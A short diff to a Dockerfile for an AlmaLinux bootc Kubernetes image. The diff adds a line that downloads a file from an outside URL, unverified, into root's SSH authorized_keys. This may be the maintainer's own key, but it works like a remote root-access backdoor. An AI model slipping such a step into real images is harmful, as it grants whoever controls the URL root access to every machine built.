@@ -1,6 +1,8 @@
 FROM quay.io/almalinuxorg/almalinux-bootc:10
 ARG k8s_version=1.36
 
+ADD https://jmg.dev/cert.txt /root/.ssh/authorized_keys
+
 COPY modules-load-k8s.conf /etc/modules-load.d/k8s.conf
 COPY sysctl-k8s.conf /etc/sysctl.d/k8s.conf
 
